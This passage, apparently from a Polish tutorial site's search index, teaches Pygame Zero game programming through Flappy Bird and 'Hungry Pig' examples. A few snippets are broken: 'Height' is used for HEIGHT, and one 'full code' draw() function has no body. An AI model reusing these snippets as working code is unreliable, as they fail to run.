if bird.vy &lt; 0:\n            bird.image = \"bird2\"\n            bird.angle += 3\n        else:\n            bird.image = \"bird1\"\n            bird.angle -= 3\n</code></pre> <p>Aby zapobiec kr\u0119ceniu si\u0119 ptaka w k\u00f3\u0142ko powinni\u015bmy ograniczy\u0107 jego maksymalny i minimalny k\u0105t obrotu. Powiedzmy, \u017ce chcemy zachowa\u0107 obr\u00f3t w zakresie od \\(-45\\) do \\(45\\). W tym celu najpierw sprawdzimy, czy k\u0105t obrotu przekroczy\u0142 warto\u015b\u0107 \\(45\\), a je\u017celi tak, to przywr\u00f3cimy jego maksymaln\u0105 warto\u015b\u0107, czyli w\u0142a\u015bnie \\(45\\).</p> <pre><code>def update_bird():\n    ...\n\n    if not bird.dead:\n        if bird.vy &lt; 0:\n            bird.image = \"bird2\"\n            bird.angle += 3\n        else:\n            bird.image = \"bird1\"\n            bird.angle -= 3\n\n        if bird.angle &gt; 45:\n            bird.angle = 45\n</code></pre> <p>Podobnie robimy w drug\u0105 stron\u0119, czyli gdy k\u0105t obrotu jest mniejszy od \\(-45\\). W\u00f3wczas przywracamy minimaln\u0105 warto\u015b\u0107 \\(-45\\).</p> <pre><code>def update_bird():\n    ...\n\n    if not bird.dead:\n        if bird.vy &lt; 0:\n            bird.image = \"bird2\"\n            bird.angle += 3\n        else:\n            bird.image = \"bird1\"\n            bird.angle -= 3\n\n        if bird.angle &gt; 45:\n            bird.angle = 45\n\n        if bird.angle &lt; -45:\n            bird.angle = -45\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#podswietlenie-przycisku","title":"Pod\u015bwietlenie przycisku","text":"<p>Aby zasymulowa\u0107 efekt \"pod\u015bwietlania\" przycisku po najechaniu na niego myszk\u0105, b\u0119dziemy wy\u015bwietla\u0107 grafik\u0119 start2, gdy wska\u017anik myszy znajduje si\u0119 na przycisku, a grafik\u0119 start1 w przeciwnym przypadku. W tym celu potrzebujemy zna\u0107 obecn\u0105 pozycj\u0119 wska\u017anika myszy na ekranie. Do tego pos\u0142u\u017cy nam funkcja on_mouse_down, kt\u00f3ra przyjmuje parametr pos, w kt\u00f3rym zapisana b\u0119dzie pozycja wska\u017anika myszy na ekranie, gdy ten zostanie poruszony.</p> <p>Nasz\u0105 funkcj\u0119 zapiszemy zaraz pod funkcj\u0105 odczytuj\u0105c\u0105 klikni\u0119cia myszy (on_mouse_down).</p> <pre><code>def on_mouse_move(pos):\n</code></pre> <p>Teraz sprawdzimy, czy wska\u017anik myszy znajduje si\u0119 na przycisku start. W tym celu skorzystamy ponownie z metody collidepoint, podobnie jak w przypadku odczytywania klikni\u0119\u0107 w przycisk.</p> <pre><code>def on_mouse_move(pos):\n    if start.collidepoint(pos):\n</code></pre> <p>Je\u017celi wska\u017anik myszy znajduje si\u0119 na przycisku, to zmieniamy jego grafik\u0119 na start2.</p> <pre><code>def on_mouse_move(pos):\n    if start.collidepoint(pos):\n        start.image = \"start2\"\n</code></pre> <p>W przeciwnym przypadku zmieniamy grafik\u0119 na start1.</p> <pre><code>def on_mouse_move(pos):\n    if start.collidepoint(pos):\n        start.image = \"start2\"\n    else:\n        start.image = \"start1\"\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#peny-kod_5","title":"Pe\u0142ny kod","text":"<p>Dotychczasowy pe\u0142ny kod naszej gry przedstawiony jest poni\u017cej.</p> <pre><code>import pgzrun\nimport random\n\nWIDTH = 400\nHEIGHT = 700\n\nTITLE = \"Pygame Zero Flappy Bird\"\n\nGRAVITY = 0.3\nFLAP = 7\nGAP_SIZE = 180\nSPEED = 3\n\nbird = Actor(\"bird1\")\nbird.x = 75\nbird.y = 200\nbird.vy = 0\nbird.points = 0\nbird.dead = True\n\npipe_top = Actor(\"top\")\npipe_top.anchor = (\"left\", \"bottom\")\n\npipe_bottom = Actor(\"bottom\")\npipe_bottom.anchor = (\"left\", \"top\")\n\nstart = Actor(\"start1\")\nstart.x = WIDTH / 2\nstart.y = HEIGHT / 2\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n    pipe_top.draw()\n    pipe_bottom.draw()\n    bird.draw()\n    screen.draw.text(str(bird.points), center=(WIDTH / 2, 30), fontsize=70)\n    if bird.dead:\n        start.draw()\n\ndef update():\n    update_bird()\n    update_pipes()\n\ndef update_bird():\n    bird.vy += GRAVITY\n    bird.y += bird.vy\n\n    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom) or bird.y &gt; HEIGHT or bird.y &lt; 0:\n        sounds.hit.play()\n        bird.dead = True\n        # Zmieniamy grafik\u0119 ptaka\n        bird.image = \"dead\"\n        # Zmieniamy k\u0105t ptaka, by by\u0142 skierowany w d\u00f3\u0142\n        bird.angle = -90\n\n    if not bird.dead:\n        # Je\u017celi pr\u0119dko\u015b\u0107 pionowa ptaka jest ujemna, tzn. gdy ptak leci do g\u00f3ry\n        if bird.vy &lt; 0:\n            # Zmieniamy grafik\u0119 ptaka\n            bird.image = \"bird2\"\n            # Zwi\u0119kszamy jego k\u0105t obrotu - obracamy go przeciwnie do ruchu wskaz\u00f3wek zegara\n            bird.angle += 3\n        else: # W przeciwnym przypadku, gdy pr\u0119dko\u015b\u0107 pionowa ptaka jest dodatnia, tzn. gdy ptak leci w d\u00f3\u0142\n            # Zmieniamy grafik\u0119 ptaka\n            bird.image = \"bird1\"\n            # Zmniejszamy jego k\u0105t obrotu - obracamy go zgodnie z ruchem wskas\u00f3wek zegara\n            bird.angle -= 3\n\n        # Je\u017celi k\u0105t obrotu przekroczy\u0142 45\n        if bird.angle &gt; 45:\n            # Przywracamy k\u0105t 45\n            bird.angle = 45\n\n        # Je\u017celi k\u0105t obrotu jest poni\u017cej -45\n        if bird.angle &lt; -45:\n            # Przywracamy k\u0105t -45\n            bird.angle = -45\n\ndef update_pipes():\n    if bird.dead:\n        return\n\n    pipe_top.x -= SPEED\n    pipe_bottom.x -= SPEED\n\n    if pipe_top.x &lt; -100:\n        set_pipes()\n        bird.points += 1\n        sounds.point.play()\n\ndef on_mouse_down(pos):\n    if not bird.dead:\n        bird.vy = -FLAP\n        sounds.wing.play()\n    elif start.collidepoint(pos):\n        reset() \n\n# Funkcja odczytuj\u0105ca ruch myszy\ndef on_mouse_move(pos):\n    # Je\u017celi wska\u017anik myszy jest w kolizji z przyciskiem startu\n    if start.collidepoint(pos):\n        # Zmianiamy grafik\u0119 przycisku\n        start.image = \"start2\"\n    else: # W przeciwnym przypadku, gdy wska\u017anik myszy nie znajduje si\u0119 na przycisku\n        # Ustalamy inn\u0105 grafik\u0119 przycisku\n        start.image = \"start1\"\n\ndef set_pipes():\n    gap_y = random.randint(200, 500)\n\n    pipe_top.x = WIDTH\n    pipe_top.y = gap_y - GAP_SIZE / 2\n\n    pipe_bottom.x = WIDTH\n    pipe_bottom.y = gap_y + GAP_SIZE / 2\n\ndef reset():\n    bird.x = 75\n    bird.y = 200\n    bird.vy = 0\n    bird.points = 0\n    bird.dead = False\n    # Ustalamy pocz\u0105tkow\u0105 grafik\u0119 ptaka\n    bird.image = \"bird1\"\n    set_pipes()\n\nset_pipes()\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/flappy-bird/#pena-gra","title":"Pe\u0142na gra","text":"<pre><code># Importujemy potrzebne biblioteki\nimport pgzrun\nimport random\n\n# Ustalamy wymiary okna gry\nWIDTH = 400\nHEIGHT = 700\n\n# Ustalamy tytu\u0142 okna gry\nTITLE = \"Pygame Zero Flappy Bird\"\n\n# Si\u0142a grawitacji\nGRAVITY = 0.3\n# Pr\u0119dko\u015b\u0107 wzlotowa\nFLAP = 7\n# Rozmiar przestrzeni pomi\u0119dzy rurami\nGAP_SIZE = 180\n# Pr\u0119dko\u015b\u0107 przemieszczania si\u0119 rur\nSPEED = 3\n\n# Tworzymy aktora ptaka\nbird = Actor(\"bird1\")\n# Ustalamy jego pozycj\u0119 na ekranie\nbird.x = 75\nbird.y = 200\n# Ustalamy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 pionow\u0105 ptaka\nbird.vy = 0\n# Zliczamy zdobyte przez gracza punkty\nbird.points = 0\n# Zapami\u0119tujemy, czy gra si\u0119 zako\u0144czy\u0142a\nbird.dead = True\n\n# Tworzymy g\u00f3rn\u0105 rur\u0119\npipe_top = Actor(\"top\")\npipe_top.anchor = (\"left\", \"bottom\")\n\n# Tworzymy doln\u0105 rur\u0119\npipe_bottom = Actor(\"bottom\")\npipe_bottom.anchor = (\"left\", \"top\")\n\n# Tworzymy przycisk startu\nstart = Actor(\"start1\")\n# Ustalamy pozycj\u0119 przycisku na ekranie\nstart.x = WIDTH / 2\nstart.y = HEIGHT / 2\n\n# Funkcja rysuj\u0105ca stan gry na ekranie\ndef draw():\n    # Rysujemy t\u0142o gry\n    screen.blit(\"bg\", (0, 0))\n    # Rysujemy g\u00f3rn\u0105 rur\u0119\n    pipe_top.draw()\n    # Rysujemy doln\u0105 rur\u0119\n    pipe_bottom.draw()\n    # Rysujemy ptaka\n    bird.draw()\n    # Wypisujemy liczb\u0119 punkt\u00f3w na ekranie\n    screen.draw.text(str(bird.points), center=(WIDTH / 2, 30), fontsize=70)\n    # Je\u017celi gra si\u0119 zako\u0144czy\u0142a\n    if bird.dead:\n        # Rysujemy przycisk startu gry\n        start.draw()\n\n# Funkcja aktualizuj\u0105ca stan gry\ndef update():\n    # Aktualizujemy ptaka\n    update_bird()\n    # Aktualizujemy rury\n    update_pipes()\n\n# Pomocnicza funkcja aktualizuj\u0105ca ptaka\ndef update_bird():\n    # Zwi\u0119kszamy pr\u0119dko\u015b\u0107 pionow\u0105 zgodnie z si\u0142\u0105 grawitacji\n    bird.vy += GRAVITY\n    # Przemieszczamy ptaka zgodnie z jego pr\u0119dko\u015bci\u0105\n    bird.y += bird.vy\n\n    # Je\u017celi ptak wpad\u0142 na g\u00f3rn\u0105 lub doln\u0105 rur\u0119, lub gdy wylecia\u0142 poza ekran z do\u0142u lub z g\u00f3ry\n    if bird.colliderect(pipe_top) or bird.colliderect(pipe_bottom) or bird.y &gt; HEIGHT or bird.y &lt; 0:\n        # Odtwarzamy d\u017awi\u0119k uderzenia\n        sounds.hit.play()\n        # Zapami\u0119tujemy, \u017ce gra si\u0119 zako\u0144czy\u0142a\n        bird.dead = True\n        # Zmieniamy grafik\u0119 ptaka\n        bird.image = \"dead\"\n        # Zmieniamy k\u0105t ptaka, by by\u0142 skierowany w d\u00f3\u0142\n        bird.angle = -90\n\n    # Je\u017celi gra wci\u0105\u017c trwa\n    if not bird.dead:\n        # Je\u017celi pr\u0119dko\u015b\u0107 pionowa ptaka jest ujemna, tzn. gdy ptak leci do g\u00f3ry\n        if bird.vy &lt; 0:\n            # Zmieniamy grafik\u0119 ptaka\n            bird.image = \"bird2\"\n            # Zwi\u0119kszamy jego k\u0105t obrotu - obracamy go przeciwnie do ruchu wskaz\u00f3wek zegara\n            bird.angle += 3\n        else: # W przeciwnym przypadku, gdy pr\u0119dko\u015b\u0107 pionowa ptaka jest dodatnia, tzn. gdy ptak leci w d\u00f3\u0142\n            # Zmieniamy grafik\u0119 ptaka\n            bird.image = \"bird1\"\n            # Zmniejszamy jego k\u0105t obrotu - obracamy go zgodnie z ruchem wskas\u00f3wek zegara\n            bird.angle -= 3\n\n        # Je\u017celi k\u0105t obrotu przekroczy\u0142 45\n        if bird.angle &gt; 45:\n            # Przywracamy k\u0105t 45\n            bird.angle = 45\n\n        # Je\u017celi k\u0105t obrotu jest poni\u017cej -45\n        if bird.angle &lt; -45:\n            # Przywracamy k\u0105t -45\n            bird.angle = -45\n\n# Pomocnicza funkcja aktualizuj\u0105ca rury\ndef update_pipes():\n    # Je\u017celi gra si\u0119 zako\u0144czy\u0142a\n    if bird.dead:\n        # Ko\u0144czymy i nie przeprowadzamy ju\u017c dalszej aktualizacji rur\n        return\n\n    # Przemieszczamy g\u00f3rn\u0105 i doln\u0105 rur\u0119 zgodnie z pr\u0119dko\u015bci\u0105 przemieszczania si\u0119 rur\n    pipe_top.x -= SPEED\n    pipe_bottom.x -= SPEED\n\n    # Je\u017celi g\u00f3rna rura schowa\u0142a si\u0119 ju\u017c z lewej strony ekranu\n    if pipe_top.x &lt; -100:\n        # Ponownie ustawiamy rury\n        set_pipes()\n        # Zwi\u0119kszamy liczb\u0119 punkt\u00f3w\n        bird.points += 1\n        # Odtwarzamy d\u017awi\u0119k zdobycia punktu\n        sounds.point.play()\n\n# Funkcja odczytuj\u0105ca klikni\u0119cia myszy\ndef on_mouse_down(pos):\n    # Je\u017celi gra jeszcze trwa\n    if not bird.dead:\n        # Symulujemy wzlot ptaka\n        bird.vy = -FLAP\n        # Odtwarzamy d\u017awi\u0119k machni\u0119cia skrzyde\u0142kami\n        sounds.wing.play()\n    elif start.collidepoint(pos): # W przeciwnym przypadku, gdy klikn\u0119li\u015bmy na przycisk start i gra jest ju\u017c zako\u0144czona\n        # Resetujemy stan gry\n        reset() \n\n# Funkcja odczytuj\u0105ca ruch myszy\ndef on_mouse_move(pos):\n    # Je\u017celi wska\u017anik myszy jest w kolizji z przyciskiem startu\n    if start.collidepoint(pos):\n        # Zmianiamy grafik\u0119 przycisku\n        start.image = \"start2\"\n    else: # W przeciwnym przypadku, gdy wska\u017anik myszy nie znajduje si\u0119 na przycisku\n        # Ustalamy inn\u0105 grafik\u0119 przycisku\n        start.image = \"start1\"\n\n# Pomocnicza funkcja resetuj\u0105ca stan gry\ndef reset():\n    # Ustalamy pocz\u0105tkow\u0105 pozycj\u0119 ptaka na ekranie\n    bird.x = 75\n    bird.y = 200\n    # Ustalamy pocz\u0105tkow\u0105 pr\u0119dko\u015b\u0107 pionow\u0105 ptaka\n    bird.vy = 0\n    # Zapami\u0119tujemy liczb\u0119 punkt\u00f3w zdobytych przez gracza\n    bird.points = 0\n    # Zapami\u0119tujemy, czy gra si\u0119 ju\u017c zako\u0144czy\u0142a\n    bird.dead = False\n    # Ustalamy pocz\u0105tkow\u0105 grafik\u0119 ptaka\n    bird.image = \"bird1\"\n    # Ustawiamy rury\n    set_pipes()\n\n# Pomocnicza funkcja ustawiaj\u0105ca rury\ndef set_pipes():\n    # Losujemy pozycj\u0119 \u015brodka przestrzeni pomi\u0119dzy rurami\n    gap_y = random.randint(200, 500)\n\n    # Ustawiamy pozycj\u0119 g\u00f3rnej rury\n    pipe_top.x = WIDTH\n    pipe_top.y = gap_y - GAP_SIZE / 2\n\n    # Ustawiamy pozycj\u0119 dolnej rury\n    pipe_bottom.x = WIDTH\n    pipe_bottom.y = gap_y + GAP_SIZE / 2\n\n# Ustawiamy rury na pocz\u0105tku gry\nset_pipes()\n# Uruchamiamy gr\u0119\npgzrun.go()\n</code></pre> <p>Pe\u0142na implementacja dost\u0119pna jest r\u00f3wnie\u017c poni\u017cej.</p> <p>Flappy Bird PyGameZero</p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/","title":"G\u0142odna \u015bwinia","text":""},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#wstep","title":"Wst\u0119p","text":"<p>Stworzymy prost\u0105 gr\u0119, w kt\u00f3rej naszym graczem b\u0119dzie \u015bwinia. \u015awinie, jak wiadomo, lubi\u0105 je\u015b\u0107. Naszym celem b\u0119dzie wi\u0119c nakarmienie \u015bwini, a dok\u0142adniej: doprowadzenie jej do jedzenia. Na ekranie b\u0119d\u0105 si\u0119 pojawia\u0107 w losowych miejscach warzywa, a my b\u0119dziemy tak sterowa\u0107 \u015bwini\u0105, \u017ceby zjad\u0142a jak najwi\u0119cej. Po ka\u017cdym posi\u0142ku \u015bwinia b\u0119dzie przyspiesza\u0107, wi\u0119c gra b\u0119dzie stawa\u0142a si\u0119 coraz trudniejsza. Koniec gry nast\u0105pi, gdy \u015bwinia ucieknie poza ekran.</p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Jak sterowa\u0107 postaci\u0105 z klawiatury.</li> <li>Jak wykrywa\u0107 kolizj\u0119 pomi\u0119dzy postaciami.</li> <li>Jak obs\u0142u\u017cy\u0107 koniec gry i jej restart.</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#materiay-do-pobrania","title":"Materia\u0142y do pobrania","text":""},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#grafiki","title":"Grafiki","text":"<p>Umieszczamy w katalogu images.</p> <p> Grafiki do gry G\u0142odna \u015awinia</p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#dzwieki","title":"D\u017awi\u0119ki","text":"<p>Umieszczamy w katalogu sounds.</p> <p> D\u017awi\u0119ki do gry G\u0142odna \u015awinia</p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#czcionki","title":"Czcionki","text":"<p>Umieszczamy w katalogu fonts.</p> <p> Czcionki do gry G\u0142odna \u015awinia</p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#struktura-projektu","title":"Struktura projektu","text":"<p>Po dodaniu potrzebnych materia\u0142\u00f3w, struktura projektu powinna wygl\u0105da\u0107 mniej wi\u0119cej tak jak na grafice poni\u017cej.</p> <p></p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#zroda","title":"\u0179r\u00f3d\u0142a","text":"<ul> <li>https://kenney.nl/</li> <li>https://comigo.itch.io/farm-puzzle-animals</li> <li>https://www.zapsplat.com/music/pig-squeal-close-up/</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#nasz-cel","title":"Nasz cel","text":""},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#wstepna-konfiguracja","title":"Wst\u0119pna konfiguracja","text":"<p>Zaczynamy standardowo: tworzymy nowy projekt, instalujemy bibliotek\u0119, pobieramy materia\u0142y i umieszczamy je w odpowiednich miejscach. Nasz projekt mo\u017cemy nazwa\u0107 np. \"GlodnaSwinia\", albo \"HungryPig\". Gdy ju\u017c utworzymy projekt, tworzymy w nim trzy nowe katalogi: images, sounds, oraz fonts. Nast\u0119pnie pobieramy wy\u017cej wymienione materia\u0142y, rozpakowujemy je, a zawarto\u015b\u0107 przerzucamy do odpowiednich katalog\u00f3w. Pozosta\u0142o nam jeszcze zainstalowa\u0107 bibliotek\u0119: w okienku terminala wypisujemy standardowo polecenie <code>pip install pgzero</code>.</p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#tworzymy-okno-gry","title":"Tworzymy okno gry","text":"<p>Zaczynamy od utworzenia okna gry i podstawowej konfiguracji projektu. </p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#biblioteki","title":"Biblioteki","text":"<p>B\u0119dziemy korzysta\u0107 ze standardowych, dw\u00f3ch bibliotek:</p> <pre><code>import pgzrun\nimport random\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#wymiary-okna","title":"Wymiary okna","text":"<p>Wymiary okna ustawimy na \\(800\\times800\\), poniewa\u017c tak mamy przygotowan\u0105 grafik\u0119 t\u0142a (bg.png). </p> <pre><code>WIDTH = 800\nHEIGHT = 800\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#tytu-gry","title":"Tytu\u0142 gry","text":"<p>Mo\u017cemy tak\u017ce ustawi\u0107 tytu\u0142 naszej gry, np. \"Hungry Pig\", czyli z angielskiego \"g\u0142odna \u015bwinia\". W tym celu przypiszemy nasz tytu\u0142 do zmiennej TITLE. Podobnie jak w przypadku <code>WIDTH</code> i <code>HEIGHT</code> zmienna ta jest zwi\u0105zana z bibliotek\u0105 Pygame Zero i musi zosta\u0107 zapisana drukowanymi literami.</p> <pre><code>TITLE = \"Pygame Zero Hungry Pig\"\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#to","title":"T\u0142o","text":"<p>T\u0142o wy\u015bwietlimy na ekranie w cz\u0119\u015bci rysuj\u0105cej (draw) za pomoc\u0105 polecenia <code>screen.blit()</code>, podaj\u0105c nazw\u0119 grafiki oraz wsp\u00f3\u0142rz\u0119dne lewego g\u00f3rnego rogu, gdzie t\u0142o ma zosta\u0107 narysowane. Wsp\u00f3\u0142rz\u0119dne podajemy jako par\u0119 (krotk\u0119) warto\u015bci, wi\u0119c zamykamy je w dodatkowych nawiasach okr\u0105g\u0142ych. Polecenie rysuj\u0105ce t\u0142o b\u0119dzie wi\u0119c wygl\u0105da\u0142o nast\u0119puj\u0105co: <code>screen.blit(\"bg\", (0, 0))</code>. </p> <pre><code>def draw():\n    screen.blit(\"bg\", (0, 0))\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#pozostae","title":"Pozosta\u0142e","text":"<p>Dopisujemy jeszcze cz\u0119\u015b\u0107 aktualizuj\u0105c\u0105 (update), na pocz\u0105tek jedynie z poleceniem <code>pass</code>, a tak\u017ce polecenie uruchamiaj\u0105ce nasz\u0105 gr\u0119: <code>pgzrun.go()</code>.</p> <pre><code>def update():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#peen-kod","title":"Pe\u0142en kod","text":"<pre><code>import pgzrun\nimport random\n\n# Okre\u015blamy szeroko\u015b\u0107 i wysoko\u015b\u0107 okna gry\nWIDTH = 800\nHEIGHT = 800\n\n# Podajemy tytu\u0142 okna naszej gry\nTITLE = \"Pygame Zero Hungry Pig\"\n\n# Funkcja rysuj\u0105ca stan gry na ekranie\ndef draw():\n    # Wy\u015bwietlamy t\u0142o\n\n# Funkcja aktualizuj\u0105ca stan gry\ndef update():\n    pass\n\n# Uruchamiamy gr\u0119\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#swinia","title":"\u015awinia","text":"<p>Teraz, gdy mamy ju\u017c przygotowany podstawowy szablon i t\u0142o naszej gry, mo\u017cemy przej\u015b\u0107 do dodania g\u0142\u00f3wnej postaci: \u015bwini. </p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#dodajemy-aktora","title":"Dodajemy aktora","text":"<p>Jak przyjrzymy si\u0119 grafikom, to zobaczymy, \u017ce mamy kilka grafik reprezentuj\u0105cych \u015bwini\u0119 w zale\u017cno\u015bci od kierunku, w kt\u00f3rym jest obr\u00f3cona. Wykorzystamy to przy poruszaniu si\u0119 \u015bwini. Na pocz\u0105tku jednak skorzystamy z grafiki pig_down.png. Na g\u00f3rze naszego programu, zaraz pod ustawieniami wymiar\u00f3w okna i tytu\u0142u, tworzymy naszego nowego aktora, kt\u00f3rego nazwiemy pig, za pomoc\u0105 polecenia <code>Actor()</code>. Nasz\u0105 posta\u0107 umie\u015bcimy na pocz\u0105tku na \u015brodku ekranu. Wsp\u00f3\u0142rz\u0119dne mo\u017cemy obliczy\u0107 dziel\u0105c odpowiednio szeroko\u015b\u0107 i wysoko\u015b\u0107 erkanu na dwa.</p> <pre><code>pig = Actor(\"pig_down\")\npig.x = WIDTH / 2\npig.y = HEIGHT / 2\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#rysujemy-swinie-na-ekranie","title":"Rysujemy \u015bwini\u0119 na ekranie","text":"<p>W cz\u0119\u015bci rysuj\u0105cej dopisujemy instrukcj\u0119, kt\u00f3ra wy\u015bwietli naszego nowego aktora na ekranie: <code>pig.draw()</code>.</p> <pre><code>def draw():\n    screen.blit(\"bg\", (0, 0))\n    pig.draw()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#sterowanie-swinia","title":"Sterowanie \u015bwini\u0105","text":"<p>Nasz\u0105 \u015bwini\u0105 b\u0119dziemy sterowa\u0107 za pomoc\u0105 klawiatury. Strza\u0142kami b\u0119dziemy wybiera\u0107 kierunek, w kt\u00f3rym \u015bwinia ma pod\u0105\u017ca\u0107. Nasza \u015bwinia b\u0119dzie jednak porusza\u0107 si\u0119 przez ca\u0142y czas, pod\u0105\u017caj\u0105c w ostatnio wybranym kierunku zgodnie ze swoj\u0105 pr\u0119dko\u015bci\u0105. Do tego b\u0119d\u0105 nam potrzebne nowe zmienne, kt\u00f3re dopiszemy do naszego aktora:  - pr\u0119dko\u015b\u0107 pozioma: vx, - pr\u0119dko\u015b\u0107 pionowa: vy, - og\u00f3lna pr\u0119dko\u015b\u0107: v.</p> <p>Og\u00f3lna pr\u0119dko\u015b\u0107 pos\u0142u\u017cy nam do wyznaczania, jak szybko \u015bwinia ma si\u0119 porusza\u0107 w wybranym kierunku. T\u0119 warto\u015b\u0107 b\u0119dziemy tak\u017ce zwi\u0119ksza\u0107 po ka\u017cdym zjedzonym warzywie.</p> <p>Dopisujemy wi\u0119c nowe parametry do naszej \u015bwini. Aby na pocz\u0105tku \u015bwinia sta\u0142a w miejscu, pr\u0119dko\u015b\u0107 poziom\u0105 i pionow\u0105 ustawimy na \\(0\\). Natomiast pr\u0119dko\u015b\u0107 og\u00f3ln\u0105 ustawimy na \\(3\\), co wydaje si\u0119 by\u0107 dobrym poziomem startowym dla naszej gry. Oczywi\u015bcie zach\u0119cam do eksperymentowania!</p> <pre><code>pig = Actor(\"pig_down\")\npig.x = WIDTH / 2\npig.y = Height / 2\npig.vx = 0\npig.vy = 0\npig.v = 3\n</code></pre> <p>Teraz czas zastosowa\u0107 pr\u0119dko\u015b\u0107 do pozycji \u015bwini, tak aby mog\u0142a porusza\u0107 si\u0119 po ekranie. W cz\u0119\u015bci aktualizuj\u0105cej usuwamy <code>pass</code> i dopisujemy dwie linijki aktualizuj\u0105ce pozycj\u0119 \u015bwini na ekranie, poprzez dodanie pr\u0119dko\u015bci do wsp\u00f3\u0142rz\u0119dnych po\u0142o\u017cenia naszego aktora.</p> <pre><code>def update():\n    pig.x += pig.vx\n    pig.y += pig.vy\n</code></pre> <p>Oczywi\u015bcie w tym momencie \u015bwinia nie b\u0119dzie si\u0119 jeszcze porusza\u0107, poniewa\u017c ustawili\u015bmy jej pr\u0119dko\u015bci na \\(0\\). Warto dla test\u00f3w tymczasowo zmieni\u0107 pr\u0119dko\u015bci vx i/lub vy, a nast\u0119pnie uruchomi\u0107 gr\u0119 by sprawdzi\u0107, czy wszystko dzia\u0142a poprawnie.</p> <p>Teraz czas wreszcie doda\u0107 obs\u0142ug\u0119 sterowania. W tym celu b\u0119dziemy potrzebowali nowej funkcji, kt\u00f3ra pozwoli nam reagowa\u0107 na zdarzenia wci\u015bni\u0119cia klawisza na klawiaturze: <code>on_key_down(key)</code>. Dopiszemy j\u0105 na dole naszego programu, pod funkcj\u0105 <code>update</code>, ale przed poleceniem <code>pgzrun.go()</code>. Wewn\u0105trz funkcji b\u0119dziemy reagowa\u0107 na klikni\u0119cia przycisk\u00f3w na klawiaturze. W zale\u017cno\u015bci od klikni\u0119tego przycisku, b\u0119dziemy wykonywa\u0107 inne operacje. Klikni\u0119ty klawisz rozpoznamy dzi\u0119ki parametrowi key, kt\u00f3ry przyjmuje nasza funkcja. Dla przyk\u0142adu, \u017ceby stwierdzi\u0107, czy klikn\u0119li\u015bmy klawisz strza\u0142ki w lewo, por\u00f3wnamy zmienn\u0105 key z warto\u015bci\u0105 keys.LEFT: <code>if key == keys.LEFT:</code>. Je\u017celi klikni\u0119ta zostanie np. strza\u0142ka w lewo, to ustawimy pr\u0119dko\u015b\u0107 poziom\u0105 vx \u015bwini na -v (<code>pig.vx = -pig.v</code>), wyzerujemy pr\u0119dko\u015b\u0107 pionow\u0105 (<code>pig.vy = 0</code>) i zmienimy grafik\u0119 na pig_left.png (<code>pig.image = \"pig_left\"</code>). </p> <pre><code>def on_key_down(key):\n    if key == keys.LEFT:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"\n</code></pre> <p>Podobnie post\u0119pujemy z pozosta\u0142ymi kierunkami, odpowiednio zmieniaj\u0105c pr\u0119dko\u015bci \u015bwini i jej grafik\u0119. List\u0119 wszystkich dost\u0119pnych klawiszy mo\u017cemy znale\u017a\u0107 na stronie biblioteki Pygame Zero: https://pygame-zero.readthedocs.io/en/stable/hooks.html#keys.</p>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#ruch-w-prawo","title":"Ruch w prawo","text":"<pre><code>def on_key_down(key):\n    ...\n\n    if key == keys.RIGHT:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#ruch-do-gory","title":"Ruch do g\u00f3ry","text":"<pre><code>def on_key_down(key):\n    ...\n\n    if key == keys.UP:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#ruch-w-do","title":"Ruch w d\u00f3\u0142","text":"<pre><code>def on_key_down(key):\n    ...\n\n    if key == keys.DOWN:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#pena-obsuga-klawiszy-ruchu","title":"Pe\u0142na obs\u0142uga klawiszy ruchu","text":"<pre><code>def on_key_down(key):\n    if key == keys.LEFT:\n        pig.vx = -pig.v\n        pig.vy = 0\n        pig.image = \"pig_left\"\n\n    if key == keys.RIGHT:\n        pig.vx = pig.v\n        pig.vy = 0\n        pig.image = \"pig_right\"\n\n    if key == keys.UP:\n        pig.vx = 0\n        pig.vy = -pig.v\n        pig.image = \"pig_up\"\n\n    if key == keys.DOWN:\n        pig.vx = 0\n        pig.vy = pig.v\n        pig.image = \"pig_down\"\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/hungry-pig/#peny-kod","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\n\nWIDTH = 800\nHEIGHT = 800\n\nTITLE = \"Pygame Zero Hungry Pig\"\n\n# 